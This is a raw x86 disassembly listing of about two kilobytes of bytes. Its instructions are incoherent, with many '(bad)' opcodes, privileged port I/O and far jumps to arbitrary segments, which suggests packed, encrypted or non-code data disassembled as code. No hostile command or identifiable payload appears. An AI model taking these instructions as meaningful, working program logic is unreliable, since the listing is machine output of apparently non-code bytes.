  426e26:	pop    ebp
  426e27:	mov    ebx,0x42085616
  426e2c:	cs pop es
  426e2e:	repnz mov fs,WORD PTR gs:[esp+ebp*1+0x40]
  426e34:	push   ebp
  426e35:	inc    edi
  426e36:	mov    edi,0x7fba5f4e
  426e3b:	out    dx,al
  426e3c:	scas   eax,DWORD PTR es:[edi]
  426e3d:	inc    esp
  426e3e:	mov    eax,0xd264f688
  426e43:	sbb    edx,DWORD PTR [esi]
  426e45:	(bad)  
  426e46:	into   
  426e47:	sbb    eax,0x5855744e
  426e4c:	lods   eax,DWORD PTR ds:[esi]
  426e4d:	xor    ah,dl
  426e4f:	mov    dh,bl
  426e51:	adc    eax,0x5a49ed6
  426e56:	push   esp
  426e57:	mov    eax,ds:0x46104cdd
  426e5c:	fstp   QWORD PTR [esi-0x2c]
  426e5f:	hlt    
  426e60:	push   cs
  426e61:	sti    
  426e62:	cmp    ebp,eax
  426e64:	add    BYTE PTR [esi],dh
  426e66:	mov    bl,0x6a
  426e68:	push   esp
  426e69:	cwde   
  426e6a:	adc    al,BYTE PTR [eax]
  426e6c:	shr    al,0x16
  426e6f:	adc    eax,0xfca35874
  426e74:	xchg   edx,eax
  426e75:	shl    BYTE PTR [eax+esi*1-0x25f4301c],1
  426e7c:	xor    DWORD PTR [esi],edx
  426e7e:	and    DWORD PTR es:[esi-0x4e],eax
  426e82:	inc    edi
  426e83:	dec    esp
  426e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426e85:	lock test al,0x29
  426e88:	rcl    ch,1
  426e8a:	add    al,0xd
  426e8c:	mov    dh,0xc
  426e8e:	mov    bh,dl
  426e90:	pop    esp
  426e91:	or     BYTE PTR [eax],bh
  426e93:	mov    al,0xed
  426e95:	enter  0xb458,0x68
  426e99:	xor    al,0xbe
  426e9b:	cdq    
  426e9c:	cmp    bl,al
  426e9e:	hlt    
  426e9f:	mov    ss,WORD PTR [ebp+0x15]
  426ea2:	mov    dh,0x69
  426ea4:	sub    BYTE PTR [ecx-0x7d],0x60
  426ea8:	push   ss
  426ea9:	mov    ch,ah
  426eab:	cmp    al,0x1
  426ead:	pop    edx
  426eae:	inc    ebp
  426eaf:	adc    ebp,DWORD PTR [esp+eax*1-0x7e]
  426eb3:	mov    ebx,DWORD PTR [esi]
  426eb5:	mov    es,WORD PTR [ecx-0x23b30560]
  426ebb:	rcl    BYTE PTR [eax-0x5f],1
  426ebe:	fcomp  DWORD PTR [edx+0x4ce85a74]
  426ec4:	gs xchg edx,eax
  426ec6:	cmp    ch,BYTE PTR [edx]
  426ec8:	dec    esp
  426ec9:	pop    ebx
  426eca:	shl    dl,1
  426ecc:	and    eax,DWORD PTR [eax]
  426ece:	mov    edi,eax
  426ed0:	push   ss
  426ed1:	repnz or eax,DWORD PTR cs:[edx-0x7c915da]
  426ed9:	cmp    BYTE PTR [edx],al
  426edb:	mov    esi,0x163654f2
  426ee0:	les    eax,FWORD PTR [edx-0x696d9f7b]
  426ee6:	pop    eax
  426ee7:	pop    edx
  426ee8:	inc    ebx
  426ee9:	sub    DWORD PTR ds:0x1cafb4bc,0xdbd43124
  426ef3:	inc    eax
  426ef4:	sub    BYTE PTR [eax-0x6de565d6],0xad
  426efb:	inc    esi
  426efc:	jmp    0x2891:0xd0ba1eee
  426f03:	adc    BYTE PTR [esi-0x79e6a882],cl
  426f09:	popa   
  426f0a:	add    eax,0xf61ebe3b
  426f0f:	cmp    al,0xef
  426f11:	xchg   edi,eax
  426f12:	fidiv  WORD PTR [eax]
  426f14:	push   ss
  426f15:	or     eax,0x5e5fe68e
  426f1a:	into   
  426f1b:	repnz add BYTE PTR [edi*4+0x14a00900],al
  426f23:	ficom  WORD PTR [eax-0x10]
  426f26:	shr    DWORD PTR [ebx+ebp*1+0x68],1
  426f2a:	push   ss
  426f2b:	mov    cl,0xe4
  426f2d:	dec    eax
  426f2e:	pusha  
  426f2f:	lahf   
  426f30:	jo     0x426f9c
  426f32:	push   edx
  426f33:	jno    0x426f3a
  426f35:	iret   
  426f36:	js     0x426edb
  426f38:	mov    edi,ss
  426f3a:	add    BYTE PTR [edi],dl
  426f3c:	or     BYTE PTR [edx+0x79],al
  426f3f:	ficomp WORD PTR [ebp-0x7e8aa166]
  426f45:	(bad)  
  426f46:	push   eax
  426f47:	stc    
  426f48:	sbb    BYTE PTR [eax],bl
  426f4a:	mov    dh,0x0
  426f4c:	inc    ecx
  426f4d:	push   0x7
  426f4f:	adc    al,0x35
  426f51:	adc    eax,0xf60982d1
  426f56:	mov    bl,bl
  426f58:	in     al,dx
  426f59:	arpl   WORD PTR [edx+edi*1-0x80],bp
  426f5d:	push   esi
  426f5e:	push   ss
  426f5f:	lea    ecx,[ebx+0x3a]
  426f62:	mov    edi,0xd06c1c8e
  426f67:	push   ebp
  426f68:	icebp  
  426f69:	dec    esp
  426f6a:	xchg   edx,eax
  426f6b:	mov    al,ds:0xcd3e309a
  426f70:	test   ch,ch
  426f72:	push   edx
  426f73:	fdivr  DWORD PTR [edx+0x62]
  426f76:	mov    al,0x96
  426f78:	cmp    BYTE PTR [esi-0x2eca45c3],bh
  426f7e:	pusha  
  426f7f:	aas    
  426f80:	jbe    0x426fe5
  426f82:	push   ebx
  426f83:	push   ss
  426f84:	xchg   edx,eax
  426f85:	add    eax,0x995405b2
  426f8a:	or     al,0x3c
  426f8c:	mov    edx,0x48b64d46
  426f91:	push   esp
  426f92:	loopne 0x42700e
  426f94:	bound  edi,QWORD PTR [edx+0x1a]
  426f97:	retf   
  426f98:	push   edx
  426f99:	adc    cl,bl
  426f9b:	or     bh,BYTE PTR [esi]
  426f9d:	mov    WORD PTR ds:0x7429759e,cs
  426fa3:	xchg   BYTE PTR [esi+ebx*4],cl
  426fa6:	push   ecx
  426fa7:	sar    BYTE PTR [edx+0x5cfc5a0a],1
  426fad:	loop   0x426f7f
  426faf:	sti    
  426fb0:	pusha  
  426fb1:	imul   edx,eax,0x585b0dba
  426fb7:	fs push ebp
  426fb9:	push   0xfffffffe
  426fbb:	test   ah,dh
  426fbd:	xchg   ebp,eax
  426fbe:	mov    eax,ds:0xdad15ce9
  426fc3:	fnstenv [eax-0x16]
  426fc6:	add    BYTE PTR [ebp-0x18],bl
  426fc9:	in     al,0x68
  426fcb:	imul   BYTE PTR [ebp+0x2d120ab]
  426fd1:	xor    eax,0xa730ee
  426fd6:	xchg   ecx,eax
  426fd7:	mov    esi,0xaced52e2
  426fdc:	sub    ch,BYTE PTR [eax-0x11]
  426fdf:	xchg   esi,eax
  426fe0:	sub    esi,DWORD PTR [edi-0x3083f800]
  426fe6:	in     al,0xbd
  426fe8:	cmp    al,0x56
  426fea:	retf   0xfb37
  426fed:	add    BYTE PTR [esp+eax*4+0x76],dh
  426ff1:	push   ss
  426ff2:	adc    DWORD PTR [ecx+0x7b774cdc],edx
  426ff8:	add    BYTE PTR [ecx],ch
  426ffa:	push   esi
  426ffb:	sbb    DWORD PTR [esi+0x19c73497],esi
  427001:	es push esp
  427003:	lahf   
  427004:	test   al,0x7c
  427006:	mov    al,ds:0x1a75a3a3
  42700b:	dec    esp
  42700c:	push   ss
  42700d:	dec    ecx
  42700e:	pop    edx
  42700f:	mov    al,al
  427011:	fwait
  427012:	stos   BYTE PTR es:[edi],al
  427013:	push   0xc806b16a
  427018:	fucomp st(1)
  42701a:	sbb    edx,esp
  42701c:	repz dec esp
  42701e:	test   BYTE PTR [edx+0x47],ah
  427021:	imul   ebp,edx,0x4a
  427024:	cmp    cl,BYTE PTR [esi-0x39277ae]
  42702a:	pushf  
  42702b:	cmp    BYTE PTR [esi+0x35],dh
  42702e:	xor    al,0x78
  427030:	push   DWORD PTR [eax+0x743bd422]
  427036:	xor    edi,0xffffffc7
  427039:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42703a:	rcl    ecx,1
  42703c:	sub    BYTE PTR [ebx],dh
  42703e:	pushf  
  42703f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427040:	and    al,0xdb
  427042:	sbb    BYTE PTR [esi+0x50],bl
  427045:	loopne 0x42708b
  427047:	fidiv  DWORD PTR [esi+0x67fcef06]
  42704d:	sahf   
  42704e:	add    BYTE PTR [ecx+0x43],dl
  427051:	pop    ebx
  427052:	rcl    al,1
  427054:	sbb    al,0xdd
  427056:	sub    al,0x58
  427058:	faddp  st(5),st
  42705a:	hlt    
  42705b:	cmp    cl,0x14
  42705e:	addps  xmm0,XMMWORD PTR [eax-0x53d983da]
  427065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427066:	data16 mov ah,0xab
  427069:	hlt    
  42706a:	inc    ebp
  42706b:	or     eax,0x98f9c20d
  427070:	push   cs
  427071:	mov    dh,0x4d
  427073:	push   ds
  427074:	add    BYTE PTR ds:0xfd506dfe,ah
  42707a:	xchg   ecx,eax
  42707b:	sahf   
  42707c:	dec    BYTE PTR [ebp-0x7b2c1900]
  427082:	jp     0x42703d
  427084:	into   
  427085:	push   esi
  427086:	cdq    
  427087:	test   eax,0xcf52169a
  42708c:	xor    BYTE PTR [eax],bh
  42708e:	loop   0x42708c
  427090:	ret    0x15b4
  427093:	sub    al,0xf8
  427095:	xor    BYTE PTR [edx-0x4ecb39d5],dl
  42709b:	xor    BYTE PTR [esp+edx*8-0x198a65f6],bh
  4270a2:	pop    eax
  4270a3:	sbb    al,0x16
  4270a5:	push   eax
  4270a6:	test   BYTE PTR [ebp+0xa],0xf1
  4270aa:	xor    cl,dl
  4270ac:	test   al,0x58
  4270ae:	mov    dh,0x1b
  4270b0:	arpl   sp,bx
  4270b2:	fwait
  4270b3:	cli    
  4270b4:	and    dl,BYTE PTR [ebx]
  4270b6:	shl    BYTE PTR [esi+ebx*4-0x12],1
  4270ba:	js     0x4270b8
  4270bc:	pop    esp
  4270bd:	push   esp
  4270be:	and    BYTE PTR [ecx+0xa227f9],0x40
  4270c5:	dec    esp
  4270c6:	adc    edi,DWORD PTR [esi]
  4270c8:	out    0xeb,al
  4270ca:	push   0xffffffc0
  4270cc:	mov    ebx,0xb93262
  4270d1:	mov    dl,0x54
  4270d3:	push   eax
  4270d4:	ret    0x3a14
  4270d7:	sub    eax,0xf97e6aea
  4270dc:	add    BYTE PTR [edx+0x6b93007e],ah
  4270e2:	(bad)  
  4270e3:	aad    0xe0
  4270e5:	out    dx,al
  4270e6:	js     0x42713b
  4270e8:	push   ebp
  4270e9:	push   ebx
  4270ea:	push   ebx
  4270eb:	scas   al,BYTE PTR es:[edi]
  4270ec:	adc    BYTE PTR [edi+0xa],dh
  4270ef:	cmp    esi,eax
  4270f1:	clc    
  4270f2:	fs test al,0x5
  4270f5:	pop    ebp
  4270f6:	dec    ebp
  4270f7:	sub    eax,0xe4144a7c
  4270fc:	or     al,0xe2
  4270fe:	push   ebp
  4270ff:	rcl    BYTE PTR [eax+0x70],1
  427102:	or     dh,BYTE PTR ds:0x92c8d1b4
  427108:	cld    
  427109:	or     DWORD PTR [eax],esp
  42710b:	imul   ecx,ebp,0x1a
  42710e:	shr    BYTE PTR [edx-0x42],0xe2
  427112:	adc    DWORD PTR [esi],0x6d02e81c
  427118:	push   ebx
  427119:	add    eax,0x8aacc3fa
  42711e:	pop    esi
  42711f:	mov    gs,WORD PTR ds:0x4d7151d0
  427125:	outs   dx,BYTE PTR ds:[esi]
  427126:	xor    eax,0x5b666a04
  42712b:	test   al,0x78
  42712d:	rcl    BYTE PTR [esi-0xa],1
  427130:	mov    bl,0xfa
  427132:	sahf   
  427133:	cmp    eax,0x41827614
  427138:	stos   DWORD PTR es:[edi],eax
  427139:	jns    0x42717c
  42713b:	sub    eax,esi
  42713d:	dec    ecx
  42713e:	push   ss
  42713f:	nop
  427140:	rol    BYTE PTR [edx-0x14],0x0
  427144:	std    
  427145:	in     al,dx
  427146:	mov    edi,0xe0a30a84
  42714b:	icebp  
  42714c:	jmp    0x8a9b:0x81cc6c43
  427153:	adc    al,0x5
  427155:	lock dec eax
  427157:	shl    BYTE PTR [esi-0x799c0b0e],1
  42715d:	mov    ch,0xd0
  42715f:	push   ecx
  427160:	gs jo  0x427117
  427163:	out    0x42,al
  427165:	repz push 0x57508f11
  42716b:	scas   al,BYTE PTR es:[edi]
  42716c:	cwde   
  42716d:	dec    esi
  42716e:	(bad)  
  42716f:	dec    esp
  427170:	data16 jmp 0x42719b
  427173:	adc    cl,dh
  427175:	mov    WORD PTR [ebx-0x40],?
  427178:	stos   DWORD PTR es:[edi],eax
  427179:	and    ch,dh
  42717b:	fmul   QWORD PTR [ecx-0x44]
  42717e:	mov    al,ds:0xc4f6da0d
  427183:	shr    BYTE PTR [ecx-0x28],0xd0
  427187:	push   ebp
  427188:	je     0x42719b
  42718a:	push   esi
  42718b:	sti    
  42718c:	xor    ah,BYTE PTR [eax-0x7d20010a]
  427192:	mov    es,WORD PTR [ebx-0x5e]
  427195:	scas   eax,DWORD PTR es:[edi]
  427196:	hlt    
  427197:	inc    esi
  427198:	pusha  
  427199:	sar    BYTE PTR [ecx+eiz*4],cl
  42719c:	mov    cl,0x4a
  42719e:	lea    ebx,[eax+0x56]
  4271a1:	ins    BYTE PTR es:[edi],dx
  4271a2:	pop    esi
  4271a3:	inc    edx
  4271a4:	fdivrp st(0),st
  4271a6:	add    BYTE PTR [ebx-0x3d],ah
  4271a9:	dec    esi
  4271aa:	push   0x12
  4271ac:	iret   
  4271ad:	adc    BYTE PTR [esi],al
  4271af:	aam    0x5a
  4271b1:	xchg   DWORD PTR [ecx+0x48],edx
  4271b4:	aaa    
  4271b5:	into   
  4271b6:	dec    DWORD PTR [esi+0x1adc9ad9]
  4271bc:	dec    edx
  4271bd:	dec    ebp
  4271be:	pop    ds
  4271bf:	or     BYTE PTR [ebx],bl
  4271c1:	cmp    BYTE PTR [esi-0x5e4e0527],0xc0
  4271c8:	and    DWORD PTR [esp+ebp*2+0x6d508860],esi
  4271cf:	jp     0x427224
  4271d1:	inc    ebx
  4271d2:	xlat   BYTE PTR ds:[ebx]
  4271d3:	mov    cl,0x92
  4271d5:	xor    edi,DWORD PTR [eax]
  4271d7:	push   0xa8d055ce
  4271dc:	push   es
  4271dd:	cmp    ch,BYTE PTR [ecx+esi*4+0x58]
  4271e1:	push   ss
  4271e2:	dec    eax
  4271e3:	in     eax,0xf0
  4271e5:	mov    ah,BYTE PTR [ecx]
  4271e7:	cwde   
  4271e8:	or     DWORD PTR [eax+0x26],esp
  4271eb:	cmp    al,BYTE PTR [esi]
  4271ed:	jo     0x427189
  4271ef:	ins    DWORD PTR es:[edi],dx
  4271f0:	mov    dh,0x41
  4271f2:	into   
  4271f3:	sbb    ch,dl
  4271f5:	out    dx,al
  4271f6:	add    al,0x82
  4271f8:	repz jbe 0x427217
  4271fb:	call   0x4c2a:0x3a1b5595
  427202:	retf   0xfb12
  427205:	mov    WORD PTR [ebx],ss
  427207:	push   ss
  427208:	neg    BYTE PTR [ebp+0x61992142]
  42720e:	call   0xad05:0x805cee60
  427215:	inc    edx
  427216:	mov    WORD PTR [esi],ss
  427218:	das    
  427219:	mov    edx,0x7fac4ce8
  42721e:	add    BYTE PTR [eax+esi*4+0x35],cl
  427222:	xor    al,0xdb
  427224:	push   ecx
  427225:	ror    DWORD PTR [esi+0x2cbc77d0],cl
  42722b:	push   edx
  42722c:	sbb    DWORD PTR [ebx+edx*8+0x34],esi
  427230:	pop    ebp
  427231:	(bad)  
  427232:	or     al,al
  427234:	(bad)  
  427235:	(bad)  
  427236:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427238:	bound  esp,QWORD PTR [esi+0x464d34d9]
  42723e:	or     ch,BYTE PTR [ebx+0x26]
  427241:	js     0x4271e4
  427243:	fwait
  427244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427245:	imul   ebx,DWORD PTR [edx+0x5af7df0],0x9a00b356
  42724f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427250:	imul   ebx,DWORD PTR [edx+0x24bf617a],0x1c2f859
  42725a:	mov    ds:0x5cda9669,eax
  42725f:	shl    DWORD PTR ds:0x1546b051,0x21
  427266:	mov    ds:0x24c5b075,al
  42726b:	sbb    bl,BYTE PTR [edx]
  42726d:	inc    esp
  42726e:	push   eax
  42726f:	mov    ebx,0xc27e4a9c
  427274:	adc    bh,BYTE PTR [ebp+0x52d5aac0]
  42727a:	(bad)  
  42727b:	call   0x878b0116
  427280:	jno    0x427282
  427282:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427284:	imul   edi,DWORD PTR [edx-0x778013ea],0xc64587fe
  42728e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42728f:	imul   ebx,DWORD PTR [edx+0xfcdf9b],0x2be731b7
  427299:	fimul  DWORD PTR [edx-0x38e864ea]
  42729f:	xor    al,0xc5
  4272a1:	inc    ecx
  4272a2:	inc    eax
  4272a3:	jne    0x42722f
  4272a5:	fs test al,0x9b
  4272a8:	mov    ds:0x3fc8bbf9,al
  4272ad:	add    cl,ch
  4272af:	pusha  
  4272b0:	add    BYTE PTR ds:0x8ed68f54,cl
  4272b6:	mov    esp,0x3aba2a26
  4272bb:	push   esp
  4272bc:	sub    ch,BYTE PTR [esi+ebp*1-0x20]
  4272c0:	shl    BYTE PTR ds:[eax],1
  4272c3:	rcl    DWORD PTR [esi+0x54],0xd1
  4272c7:	(bad)  
  4272c8:	outs   dx,DWORD PTR ds:[esi]
  4272c9:	pop    esi
  4272ca:	xchg   ebx,eax
  4272cb:	ret    0x707d
  4272ce:	and    dh,BYTE PTR [edi]
  4272d0:	lock push edi
  4272d2:	pop    es
  4272d3:	cmc    
  4272d4:	add    al,BYTE PTR [esi]
  4272d6:	jmp    0x4272fd
  4272d8:	add    BYTE PTR [ecx+0x4b2cfdda],ch
  4272de:	ffreep st(0)
  4272e0:	push   cs
  4272e1:	mov    ds:0xc2aac4e4,al
  4272e6:	(bad)
  4272eb:	xchg   ebp,eax
  4272ec:	pushf  
  4272ed:	cmp    DWORD PTR [esi+ebp*1-0x6c],eax
  4272f1:	inc    esp
  4272f2:	ret    
  4272f3:	mov    ds:0xb58888a6,al
  4272f8:	sub    al,0xe6
  4272fa:	inc    esi
  4272fb:	div    BYTE PTR es:0xd4cf86f4
  427302:	push   esi
  427303:	pop    edi
  427304:	sub    BYTE PTR [esi+0x0],0xaa
  427308:	mov    ds,WORD PTR [edx+ebp*1+0x3a]
  42730c:	or     ch,ah
  42730e:	push   cs
  42730f:	dec    eax
  427310:	cli    
  427311:	pop    edx
  427312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427313:	cmp    al,0x49
  427315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427316:	out    dx,al
  427317:	push   esp
  427318:	aad    0xd5
  42731a:	call   0x1f3e:0x3ea0df46
  427321:	add    BYTE PTR [esi-0x2fa9754a],cl
  427327:	or     cl,BYTE PTR [ebx]
  427329:	adc    dh,BYTE PTR [esi+0x27a0d57c]
  42732f:	mov    eax,0x615127c
  427334:	stos   BYTE PTR es:[edi],al
  427335:	ret    0x8e40
  427338:	lods   eax,DWORD PTR ds:[esi]
  427339:	and    ah,BYTE PTR [eax-0x4bab21ae]
  42733f:	sbb    eax,0xd0865548
  427344:	push   0x3e0f7c
  427349:	neg    esi
  42734b:	dec    edx
  42734c:	xchg   BYTE PTR [ebx-0x219bfb3e],ah
  427352:	cld    
  427353:	add    eax,0x3aa2b605
  427358:	ja     0x427342
  42735a:	cdq    
  42735b:	sub    al,0x16
  42735d:	ins    BYTE PTR es:[edi],dx
  42735e:	out    dx,eax
  42735f:	test   BYTE PTR [edi],cl
  427361:	or     bh,BYTE PTR [edx]
  427363:	mov    esi,0x19be5da8
  427368:	cld    
  427369:	and    ebx,DWORD PTR [esi]
  42736b:	lds    esp,FWORD PTR [esi-0x45]
  42736e:	stos   BYTE PTR es:[edi],al
  42736f:	stos   BYTE PTR es:[edi],al
  427370:	ror    BYTE PTR [ecx+0x29da7ec6],cl
  427376:	adc    DWORD PTR [edx+eiz*8],eax
  427379:	mov    eax,ds:0x9d8550c3
  42737e:	loop   0x427319
  427380:	cwde   
  427381:	mov    ah,0x11
  427383:	(bad)  
  427384:	mov    eax,ds:0xf5e6aab4
  427389:	ss adc al,0xe7
  42738c:	loop   0x427396
  42738e:	ficomp WORD PTR [edx]
  427390:	les    edx,FWORD PTR [eax+0x51]
  427393:	int    0x74
  427395:	xor    edx,esp
  427397:	inc    esp
  427398:	adc    dl,cl
  42739a:	aad    0x9a
  42739c:	or     bl,dh
  42739e:	in     eax,dx
  42739f:	push   edx
  4273a0:	xchg   esi,eax
  4273a1:	lods   al,BYTE PTR ds:[esi]
  4273a2:	(bad)  
  4273a3:	mov    WORD PTR [edi],?
  4273a5:	rcr    al,0xd5
  4273a8:	push   eax
  4273a9:	push   0xffffffd1
  4273ab:	cmp    BYTE PTR [esi-0x2e4448fe],al
  4273b1:	ds mov ch,0xfd
  4273b4:	inc    cl
  4273b6:	pop    ecx
  4273b7:	add    al,dl
  4273b9:	mov    ds,WORD PTR [edi+0x1616b2e8]
  4273bf:	ficom  DWORD PTR [edx]
  4273c1:	fimul  DWORD PTR [edx]
  4273c3:	mov    bl,0x7c
  4273c5:	call   0xbdbedea2
  4273ca:	in     eax,dx
  4273cb:	sub    dl,BYTE PTR [eax]
  4273cd:	mov    ebp,0xf2da5922
  4273d2:	pusha  
  4273d3:	call   0xc8948ec
  4273d8:	mov    ah,0x7
  4273da:	test   al,0x94
  4273dc:	xor    al,0xb4
  4273de:	int3   
  4273df:	sub    dh,dl
  4273e1:	add    BYTE PTR [edx-0x274d7afe],0x68
  4273e8:	in     al,0x95
  4273ea:	pop    esi
  4273eb:	mov    al,0xe0
  4273ed:	push   esp
  4273ee:	retf   0xc46e
  4273f1:	and    al,0xc7
  4273f3:	js     0x427401
  4273f5:	mov    ecx,0x3aae4e00
  4273fa:	sub    DWORD PTR [esi],0x9e94de6b
  427400:	arpl   WORD PTR [eax],si
  427402:	add    al,0x70
  427404:	sub    eax,0x49aca2f8
  427409:	push   es
  42740a:	jae    0x4273e0
  42740c:	aam    0x83
  42740e:	inc    edx
  42740f:	adc    BYTE PTR ds:0x14abc4de,ch
  427415:	aam    0x2
  427417:	pop    ecx
  427418:	fistp  DWORD PTR [edx+0x45]
  42741b:	(bad)  
  42741c:	mov    ss,esp
  42741e:	call   0x77fa:0xb405bee1
  427425:	jbe    0x427414
  427427:	mov    al,0xa6
  427429:	lods   eax,DWORD PTR ds:[esi]
  42742a:	mov    BYTE PTR [esp+eiz*2+0x67e8300a],dh
  427431:	mov    eax,0x43b63a36
  427436:	imul   esi,DWORD PTR [edx+0x34],0xffffff94
  42743a:	mov    ebp,DWORD PTR [edx+edi*1+0x3f]
  42743e:	jo     0x4273cf
  427440:	push   esi
  427441:	add    eax,0x617c50a8
  427446:	stos   BYTE PTR es:[edi],al
  427447:	add    BYTE PTR [esi],dh
  427449:	cwde   
  42744a:	call   0x53e35bdd
  42744f:	mov    ah,0x8a
  427451:	retf   0xe9ff
  427454:	add    BYTE PTR [ebx+0x734000cc],bl
  42745a:	add    BYTE PTR [edx-0x8],cl
  42745d:	push   ebx
  42745e:	jbe    0x4273fc
  427460:	pop    eax
  427461:	cmp    esi,0x6a56d68a
  427467:	xor    eax,0x167ffa07
  42746c:	cs fs cwde 
  42746f:	add    BYTE PTR [ebp+0x10],cl
  427472:	add    BYTE PTR [edi],bl
  427474:	dec    edi
  427475:	dec    edi
  427476:	(bad)  
  427477:	mov    ds:0x14898e66,al
  42747c:	int3   
  42747d:	or     BYTE PTR [edx-0x5],bl
  427480:	add    DWORD PTR [edx-0x4de14f93],ebx
  427486:	adc    al,0xbe
  427488:	mov    eax,ds:0x3ae71016
  42748d:	les    edx,FWORD PTR [edx+0x47]
  427490:	push   ebx
  427491:	pop    esp
  427492:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427493:	rol    eax,cl
  427495:	sub    edi,esp
  427497:	fcom   st(1)
  427499:	mov    eax,ds:0x20547424
  42749e:	pusha  
  42749f:	jp     0x42748e
  4274a1:	add    BYTE PTR [esi-0x5b714fa],0x4c
  4274a8:	sbb    dl,BYTE PTR [ebp-0x2caae532]
  4274ae:	mov    ds:0x6a7ed070,eax
  4274b3:	cs xchg esp,eax
  4274b5:	test   DWORD PTR [edi+eax*4+0x44415563],ebx
  4274bc:	dec    esi
  4274bd:	in     eax,dx
  4274be:	jmp    0x4be2:0xb43083d8
  4274c5:	popf   
  4274c6:	inc    eax
  4274c7:	lahf   
  4274c8:	jmp    0x302d:0x75d1488
  4274cf:	test   eax,0x484c88b2
  4274d4:	test   ch,dh
  4274d6:	sbb    ch,BYTE PTR [ebx]
  4274d8:	mov    edx,0xa0ecb682
  4274dd:	cmp    al,0x7a
  4274df:	mov    al,ds:0xd0f726b7
  4274e4:	mov    ch,BYTE PTR [edx]
  4274e6:	fcom   QWORD PTR [eax-0x6e]
  4274e9:	shr    dh,1
  4274eb:	push   esi
  4274ec:	sahf   
  4274ed:	pusha  
  4274ee:	inc    edx
  4274ef:	loopne 0x42747a
  4274f1:	fmul   DWORD PTR [edx+esi*8-0x42]
  4274f5:	sub    BYTE PTR [ebp-0x257e9dc4],0xb0
  4274fc:	shr    al,cl
  4274fe:	inc    dx
  427500:	adc    BYTE PTR [esp+edi*2-0x2f78bcbf],ch
  427507:	push   ds
  427508:	pushf  
  427509:	enter  0xea42,0xd6
  42750d:	out    0x0,al
  42750f:	inc    edi
  427510:	sub    esi,DWORD PTR [ebx]
  427512:	ins    DWORD PTR es:[edi],dx
  427513:	add    eax,0xf6645ecd
  427518:	in     eax,0x76
  42751a:	int    0x35
  42751c:	jl     0x4274ca
  42751e:	add    al,0xcc
  427520:	and    BYTE PTR [ecx+0x74],0x3c
  427524:	or     BYTE PTR [ecx+eax*1-0x3a],bh
  427528:	or     ebp,DWORD PTR [edi]
  42752a:	in     al,0xb2
  42752c:	add    BYTE PTR [edx+edi*8+0x60],ch
  427530:	call   0xe2ef92e5
  427535:	jb     0x42751f
  427537:	or     BYTE PTR [eax],dh
  427539:	xchg   esi,eax
  42753a:	jbe    0x4275a6
  42753c:	pop    edx
  42753d:	hlt    
  42753e:	add    eax,0x302d2978
  427543:	adc    DWORD PTR [eax-0x20],ecx
  427546:	xchg   edi,eax
  427547:	mov    edx,0xb9740d58
  42754c:	sbb    DWORD PTR ds:[ebp+edx*1+0x1b],edx
  427551:	inc    esp
  427552:	mov    esp,0xc2a9b61f
  427557:	push   ss
  427558:	mov    ah,BYTE PTR [ecx+0x38]
  42755b:	sbb    al,0x4
  42755d:	jo     0x427553
  42755f:	or     ebp,DWORD PTR [edi]
  427561:	jo     0x4275dd
  427563:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427564:	inc    ebp
  427565:	or     eax,0x527a6a14
  42756a:	js     0x4275ce
  42756c:	mov    cl,0xb6
  42756e:	push   0xffffffa8
  427570:	jecxz  0x42750c
  427572:	ss std 
  427574:	nop
  427575:	(bad)  
  427576:	mov    dh,0x48
  427578:	push   0xffffff96
  42757a:	ins    DWORD PTR es:[edi],dx
  42757b:	lods   al,BYTE PTR ds:[esi]
  42757c:	mov    bh,0xa1
  42757e:	hlt    
  42757f:	and    bl,cl
  427581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427582:	push   ecx
  427583:	aam    0xf1
  427585:	mov    esp,0x5bfc15f9
  42758a:	push   esi
  42758b:	mov    bl,0x34
  42758d:	sub    BYTE PTR [esi+0x45],dl
  427590:	ret    
  427591:	ja     0x427601
  427593:	call   0x6c70:0x40d24b40
  42759a:	mov    dl,0x4f
  42759c:	out    0x17,al
  42759e:	in     al,dx
  42759f:	add    al,0x4c
  4275a1:	sub    DWORD PTR [edx+0x1e],ecx
  4275a4:	push   ebp
  4275a5:	xchg   ebx,eax
  4275a6:	lods   eax,DWORD PTR ds:[esi]
  4275a7:	sub    BYTE PTR [esi],dh
  4275a9:	dec    ebp
  4275aa:	pop    eax
  4275ab:	jmp    0x7cd2:0xae7ceef4
  4275b2:	sbb    ebp,DWORD PTR [ebx]
  4275b4:	ins    BYTE PTR es:[edi],dx
  4275b5:	sti    
  4275b6:	clc    
  4275b7:	xchg   esp,eax
  4275b8:	call   0x7ab135f5
  4275bd:	add    esp,edx
  4275bf:	push   esi
  4275c0:	je     0x4275c8
  4275c2:	sbb    dl,dh
  4275c4:	jmp    0xe310808d
  4275c9:	pop    edx
  4275ca:	xchg   ebx,eax
  4275cb:	or     al,0xdb
  4275cd:	inc    edx
  4275ce:	mov    al,ds:0x52744b4b
  4275d3:	cmp    bh,BYTE PTR [eax-0x17987dc8]
  4275d9:	xchg   ebx,eax
  4275da:	lods   al,BYTE PTR ds:[esi]
  4275db:	sbb    al,0x92
  4275dd:	pushf  
  4275de:	cmp    dl,BYTE PTR [edx+edx*1-0x50]
  4275e2:	dec    edi
  4275e3:	shr    BYTE PTR [edx],1
  4275e5:	aaa    
  4275e6:	push   eax
  4275e7:	mov    edx,edx
  4275e9:	adc    cl,dl
  4275eb:	sbb    al,0x40
  4275ed:	xchg   edi,eax
  4275ee:	retf   0x8414
  4275f1:	enter  0x98e2,0x29
  4275f5:	mov    dh,BYTE PTR [esi]
  4275f7:	(bad)  [eax]
  4275f9:	pop    ds
  4275fa:	push   edx
  4275fb:	add    al,0x82
  4275fd:	out    0x3b,eax
  4275ff:	je     0x427651
  427601:	inc    eax
  427602:	push   0xaa1626ba
  427607:	push   esi
  427608:	ja     0x427650
  42760a:	jnp    0x427594
  42760c:	lds    esi,FWORD PTR [edi+0x16ab6307]
  427612:	mov    edi,0x94c154ee
